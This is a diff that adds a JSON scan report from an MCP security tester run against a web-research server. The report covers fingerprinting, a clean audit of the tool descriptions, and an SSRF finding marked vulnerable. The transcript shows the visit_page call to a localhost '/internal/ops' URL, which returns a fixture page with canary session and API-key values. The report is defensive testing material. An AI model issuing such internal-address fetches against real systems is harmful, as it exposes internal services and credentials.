@@ -1,0 +1,446 @@
+{
+  "tool": "real-target-check",
+  "version": "3.1.0",
+  "started_at": "2026-10-08T12:29:52.225476+00:00",
+  "target": {
+    "transport": "stdio",
+    "base_url": null,
+    "mcp_path": null,
+    "tls_ca": null,
+    "command": [
+      "C:\\Program Files\\nodejs\\node.EXE",
+      "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+    ],
+    "profile": "black-box"
+  },
+  "findings": {
+    "P1-fingerprint": {
+      "status": "info",
+      "proof": "era=legacy transport=stdio",
+      "details": {
+        "transport": "stdio",
+        "era": "legacy",
+        "discover_error": "risposta non-discover: {'jsonrpc': '2.0', 'id': 1, 'error': {'code': -32601, 'message': 'Method not found'}}",
+        "initialize": {
+          "protocolVersion": "2024-11-05",
+          "capabilities": {
+            "tools": {},
+            "resources": {},
+            "prompts": {}
+          },
+          "serverInfo": {
+            "name": "webresearch",
+            "version": "0.1.7"
+          }
+        }
+      }
+    },
+    "P2-tool-poisoning": {
+      "status": "secure",
+      "proof": "nessuna istruzione sospetta in 3 DESCRIPTION (avg_score=100)",
+      "details": {
+        "count": 3,
+        "avg_score": 100,
+        "by_severity": {},
+        "audit": [
+          {
+            "tool": "search_google",
+            "score": 100,
+            "flags": []
+          },
+          {
+            "tool": "visit_page",
+            "score": 100,
+            "flags": []
+          },
+          {
+            "tool": "take_screenshot",
+            "score": 100,
+            "flags": []
+          }
+        ]
+      }
+    },
+    "P9-behavioral": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P10-influence": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P11-token-shape": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P3-resource-traversal": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P15-resource-content": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P4-arg-injection": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P5-tool-traversal": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P6-ssrf-collaborator": {
+      "status": "vulnerable",
+      "proof": "SSRF interna dimostrata: token tornato via ['visit_page.url=http://127.0.0.1:56802/internal/ops']",
+      "details": {
+        "hits": [
+          "visit_page.url=http://127.0.0.1:56802/internal/ops"
+        ],
+        "tried": 1,
+        "blocked": 0,
+        "swept": 1,
+        "url_args": 1,
+        "planned": 1,
+        "host_args": 0,
+        "responses": 1,
+        "policy_rejections": 0,
+        "unresolved_errors": 0,
+        "error_samples": [],
+        "max_attempts": 60,
+        "complete": true
+      }
+    },
+    "P8-sqli": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    }
+  },
+  "transcript": [
+    {
+      "direction": "->",
+      "at": 1791462592.2499397,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 1,
+          "method": "server/discover",
+          "params": {
+            "_meta": {
+              "io.modelcontextprotocol/protocolVersion": "2026-07-28",
+              "io.modelcontextprotocol/clientInfo": {
+                "name": "mcp-vulnlab-real-target",
+                "version": "3.0.0"
+              }
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1791462598.1984737,
+      "payload": {
+        "jsonrpc": "2.0",
+        "id": 1,
+        "error": {
+          "code": -32601,
+          "message": "Method not found"
+        }
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1791462598.198552,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 2,
+          "method": "initialize",
+          "params": {
+            "protocolVersion": "2025-11-25",
+            "capabilities": {},
+            "clientInfo": {
+              "name": "mcp-vulnlab-real-target",
+              "version": "3.0.0"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1791462598.2034578,
+      "payload": {
+        "result": {
+          "protocolVersion": "2024-11-05",
+          "capabilities": {
+            "tools": {},
+            "resources": {},
+            "prompts": {}
+          },
+          "serverInfo": {
+            "name": "webresearch",
+            "version": "0.1.7"
+          }
+        },
+        "jsonrpc": "2.0",
+        "id": 2
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1791462598.2035012,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "method": "notifications/initialized"
+        }
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1791462598.2035775,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 3,
+          "method": "initialize",
+          "params": {
+            "protocolVersion": "2025-11-25",
+            "capabilities": {},
+            "clientInfo": {
+              "name": "mcp-vulnlab-real-target",
+              "version": "3.0.0"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1791462598.2075994,
+      "payload": {
+        "result": {
+          "protocolVersion": "2024-11-05",
+          "capabilities": {
+            "tools": {},
+            "resources": {},
+            "prompts": {}
+          },
+          "serverInfo": {
+            "name": "webresearch",
+            "version": "0.1.7"
+          }
+        },
+        "jsonrpc": "2.0",
+        "id": 3
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1791462598.207651,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 4,
+          "method": "tools/list",
+          "params": {}
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1791462598.2091415,
+      "payload": {
+        "result": {
+          "tools": [
+            {
+              "name": "search_google",
+              "description": "Search Google for a query",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "query": {
+                    "type": "string",
+                    "description": "Search query"
+                  }
+                },
+                "required": [
+                  "query"
+                ]
+              }
+            },
+            {
+              "name": "visit_page",
+              "description": "Visit a webpage and extract its content",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "url": {
+                    "type": "string",
+                    "description": "URL to visit"
+                  },
+                  "takeScreenshot": {
+                    "type": "boolean",
+                    "description": "Whether to take a screenshot"
+                  }
+                },
+                "required": [
+                  "url"
+                ]
+              }
+            },
+            {
+              "name": "take_screenshot",
+              "description": "Take a screenshot of the current page",
+              "inputSchema": {
+                "type": "object",
+                "properties": {}
+              }
+            }
+          ]
+        },
+        "jsonrpc": "2.0",
+        "id": 4
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1791462598.2244153,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 5,
+          "method": "tools/list",
+          "params": {}
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1791462598.2302368,
+      "payload": {
+        "result": {
+          "tools": [
+            {
+              "name": "search_google",
+              "description": "Search Google for a query",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "query": {
+                    "type": "string",
+                    "description": "Search query"
+                  }
+                },
+                "required": [
+                  "query"
+                ]
+              }
+            },
+            {
+              "name": "visit_page",
+              "description": "Visit a webpage and extract its content",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "url": {
+                    "type": "string",
+                    "description": "URL to visit"
+                  },
+                  "takeScreenshot": {
+                    "type": "boolean",
+                    "description": "Whether to take a screenshot"
+                  }
+                },
+                "required": [
+                  "url"
+                ]
+              }
+            },
+            {
+              "name": "take_screenshot",
+              "description": "Take a screenshot of the current page",
+              "inputSchema": {
+                "type": "object",
+                "properties": {}
+              }
+            }
+          ]
+        },
+        "jsonrpc": "2.0",
+        "id": 5
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1791462598.339395,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/d9febec3e8a2e868/node_modules/@mzxrai/mcp-webresearch/dist/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 6,
+          "method": "tools/call",
+          "params": {
+            "name": "visit_page",
+            "arguments": {
+              "url": "http://127.0.0.1:56802/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1791462602.073043,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\n  \"url\": \"http://127.0.0.1:56802/internal/ops\",\n  \"title\": \"Internal Ops Console\",\n  \"content\": \"# INTERNAL OPS CONSOLE - restricted\\n\\nSession token=FIXTURE\\\\_CANARY\\\\_SSRF\\\\_8ebd3734\\n\\nService account: ops-svc, api\\\\_key=sk-internal-8ebd3734\\n\\nRecord #1000: ubiquity node 0, quota 512GB. Contact ops@example.internal.\\n\\nRecord #1001: ubiquity node 1, quota 1024GB. Contact ops@example.internal.\\n\\nRecord #1002: ubiquity node 2, quota 1536GB. Contact ops@example.internal.\\n\\nRecord #1003: ubiquity node 3, quota 2048GB. Contact ops@example.internal.\\n\\nRecord #1004: ubiquity node 4, quota 2560GB. Contact ops@example.internal.\\n\\nRecord #1005: ubiquity node 5, quota 3072GB. Contact ops@example.internal.\\n\\nRecord #1006: ubiquity node 6, quota 3584GB. Contact ops@example.internal.\\n\\nRecord #1007: ubiquity node 7, quota 4096GB. Contact ops@example.internal.\\n\\nRecord #1008: ubiquity node 8, quota 4608GB. Contact ops@example.internal.\\n\\nRecord #1009: ubiquity node 9, quota 5120GB. Contact ops@example.internal.\\n\\nRecord #1010: ubiquity node 10, quota 5632GB. Contact ops@example.internal.\\n\\nRecord #1011: ubiquity node 11, quota 6144GB. Contact ops@example.internal.\\n\\nEnd of report. internal-ops v3.1.0.\",\n  \"timestamp\": \"2026-10-08T12:30:02.071Z\"\n}"
+            }
+          ]
+        },
+        "jsonrpc": "2.0",
+        "id": 6
+      }
+    }
+  ],
+  "recon": {}
+}
